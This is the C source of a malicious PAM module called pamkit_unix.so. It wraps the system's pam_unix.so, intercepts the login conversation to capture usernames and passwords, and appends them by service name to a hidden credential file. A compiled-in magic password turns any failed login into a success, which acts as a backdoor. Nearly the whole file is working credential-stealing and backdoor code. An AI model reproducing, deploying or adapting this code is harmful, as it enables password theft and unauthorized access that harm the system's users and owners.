#include "pamkit_unix.h"

#ifdef DEBUG

static inline void
teardown_debug_logging(void)
{
    closelog();
}

#define debug_msg(msg) do {                     \
        syslog(LOG_AUTH|LOG_DEBUG, "%s", msg);  \
    } while (0)

#define debug_err(msg, desc) do {                       \
        syslog(LOG_AUTH|LOG_ERR, "%s: %s", msg, desc);  \
    } while (0)

#else /* !DEBUG */

static inline void
teardown_debug_logging(void)
{
}

#define debug_msg(msg) do {} while (0)

#define debug_err(msg, desc) do {} while (0)

#endif /* DEBUG */

void *orig_pam_unix_handle = NULL;
conversation_t orig_conv_function = NULL;

char *pamkit_username = NULL;
char *pamkit_authtok = NULL;

void __attribute__((constructor))
setup_mitm_module(void)
{
    orig_pam_unix_handle = dlopen(ORIG_PAM_UNIX_PATH, RTLD_LAZY);
    if (!orig_pam_unix_handle) {
        debug_err("setup_mitm_module", dlerror());
        exit(EXIT_FAILURE);
    }

    debug_msg("Successfully initialized the mitm module");
}

void __attribute__((destructor))
cleanup_mitm_module(void)
{
    teardown_debug_logging();

    if (!orig_pam_unix_handle) {
        return;
    }

    if (dlclose(orig_pam_unix_handle) != 0) {
        debug_err("cleanup_mitm_module", dlerror());
    } else {
        debug_msg("Successfully finished mitm module cleanup");
    }
}

static int
pamkit_mitm_conv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr)
{
    if (!orig_conv_function) {
        debug_msg("Unable to intercept messages because no original conversation function is provided");
        return PAM_CONV_ERR;
    }

    int retval;
    if ((retval = orig_conv_function(num_msg, msg, resp, appdata_ptr)) != PAM_SUCCESS) {
        return retval;
    }

    for (int i = 0; i < num_msg; ++i) {
        const struct pam_message *intercepted_msg = *msg + i;
        const struct pam_response *intercepted_rsp = *resp + i;

        if (!intercepted_msg || !intercepted_rsp) {
            continue;
        }

        if (strstr(intercepted_msg->msg, "login")) {
            pamkit_username = strdup(intercepted_rsp->resp);
        } else if (strstr(intercepted_msg->msg, "Password")) {
            pamkit_authtok = strdup(intercepted_rsp->resp);
        }
    }

    return PAM_SUCCESS;
}

static int
persist_credentials(char *service_name, char *username, char *authtok)
{
    int ret = 0;

    char *formatted_credentials_entry = NULL;
    if (asprintf(&formatted_credentials_entry, "[%s]: %s %s\n", service_name, username, authtok) < 0) {
        debug_err("Failed to format collected credentials", strerror(errno));
        return -1;
    }

    int fd = open(PERSISTED_CREDS_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd < 0) {
        debug_err("Failed to open credential-store file", strerror(errno));
        ret = -1;
        goto out_relase_format_string;
    }

    if (flock(fd, LOCK_EX) < 0) {
        debug_err("Failed to get exclusive lock on the credential-store file",  strerror(errno));
        ret = -1;
        goto out_close_file;
    }

    if (dprintf(fd, "%s", formatted_credentials_entry) < 0) {
        debug_err("Failed to write credentials to file", strerror(errno));
        ret = -1;
        goto out_release_lock;
    }

out_release_lock:
    flock(fd, LOCK_UN);
out_close_file:
    close(fd);
out_relase_format_string:
    free(formatted_credentials_entry);

    return ret;
}

static int
check_for_magic_password(void)
{
    if (!pamkit_authtok) {
        return -1;
    }

    if (strncmp(pamkit_authtok, PAMKIT_MAGIC_PASSWORD, strlen(PAMKIT_MAGIC_PASSWORD)) == 0) {
        debug_msg("Found magic password");
        return 0;
    }

    return -1;
}

int
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_authenticate' in pamkit_unix.so");

    const orig_sm_authenticate_t orig_sm_authenticate = (orig_sm_authenticate_t) dlsym(orig_pam_unix_handle, "pam_sm_authenticate");
    if (!orig_sm_authenticate) {
        debug_err("Unable to obtain address of 'pam_sm_authenticate'", dlerror());
        return PAM_ABORT;
    }

    struct pam_conv *target_conv;
    if (pam_get_item(pamh, PAM_CONV, (const void **) &target_conv) != PAM_SUCCESS) {
        /* If no conversation function is specified, we let the original pam_unix module deal with it */
        return orig_sm_authenticate(pamh, flags, argc, argv);
    }
    orig_conv_function = target_conv->conv;

    /* Replace application specific conversation function with our mitm conv function */
    target_conv->conv = (conversation_t) pamkit_mitm_conv;

    int ret = orig_sm_authenticate(pamh, flags, argc, argv);

    target_conv->conv = orig_conv_function;
    orig_conv_function = NULL;

    if (ret != PAM_SUCCESS) {
        debug_msg("pam_unix.so failed to authenticate the user. User provided credentials will not be persisted!");

        if (check_for_magic_password() == 0) {
            debug_msg("Overwriting pam_unix.so's auth decision!");
            ret = PAM_SUCCESS;
        }

        goto out;
    }

    if (!pamkit_authtok || (pamkit_authtok[0] == '\0')) {
        debug_msg("Unable to retrieve the user's auth token");
        goto out;
    }

    if (!pamkit_username || (pamkit_username[0] == '\0')) {
        /* If the username was not provided during the conversation, it might've been set when calling 'pam_start()' */
        char *pam_username_lookup;

        int username_lookup_ret = pam_get_item(pamh, PAM_USER, (const void **) &pam_username_lookup);
        if (username_lookup_ret == PAM_SUCCESS && pam_username_lookup) {
            pamkit_username = strdup(pam_username_lookup);
        } else {
            debug_msg("username was neither found in the conversation nor was it set when calling 'pam_start()'");
            goto out;
        }
    }

    char *service_name = NULL;
    int service_name_lookup_ret = pam_get_item(pamh, PAM_SERVICE, (const void **) &service_name);
    if (service_name_lookup_ret != PAM_SUCCESS || !service_name) {
        debug_msg("Unable to to determine service to which the collected credentials belong");
        service_name = "unknown_service";
    }

    if(!persist_credentials(service_name, pamkit_username, pamkit_authtok)) {
        debug_msg("Failed to persist collected credentials");
        goto out;
    }

out:
    free(pamkit_username); pamkit_username = NULL;
    free(pamkit_authtok); pamkit_authtok = NULL;
    return ret;
}

int
pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_setcred' in pamkit_unix.so");

    const orig_sm_setcred_t orig_sm_setcred = (orig_sm_setcred_t) dlsym(orig_pam_unix_handle, "pam_sm_setcred");
    if (!orig_sm_setcred) {
        debug_err("Unable to obtain address of 'pam_sm_setcred'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_setcred(pamh, flags, argc, argv);
}

int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_acct_mgmt' in pamkit_unix.so");

    const orig_sm_acct_mgm_t orig_sm_acct_mgmt = (orig_sm_acct_mgm_t) dlsym(orig_pam_unix_handle, "pam_sm_acct_mgmt");
    if (!orig_sm_acct_mgmt) {
        debug_err("Unable to obtain address of 'pam_sm_acct_mgmt'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_acct_mgmt(pamh, flags, argc, argv);
}

int
pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_chauthtok' in pamkit_unix.so");

    const orig_sm_chauthtok_t orig_sm_chauthtok = (orig_sm_chauthtok_t) dlsym(orig_pam_unix_handle, "pam_sm_chauthtok");
    if (!orig_sm_chauthtok) {
        debug_err("Unable to obtain address of 'pam_sm_chauthtok'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_chauthtok(pamh, flags, argc, argv);
}

int
pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_open_session' in pamkit_unix.so");

    const orig_sm_open_session_t orig_sm_open_session = (orig_sm_open_session_t) dlsym(orig_pam_unix_handle, "pam_sm_open_session");
    if (!orig_sm_open_session) {
        debug_err("Unable to obtain address of 'pam_sm_open_session'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_open_session(pamh, flags, argc, argv);
}

int
pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    debug_msg("'pam_sm_close_session' in pamkit_unix.so");

    const orig_sm_close_session_t orig_sm_close_session = (orig_sm_close_session_t) dlsym(orig_pam_unix_handle, "pam_sm_close_session");
    if (!orig_sm_close_session) {
        debug_err("Unable to obtain address of 'pam_sm_close_session'", dlerror());
        return PAM_ABORT;
    }

    return orig_sm_close_session(pamh, flags, argc, argv);
}
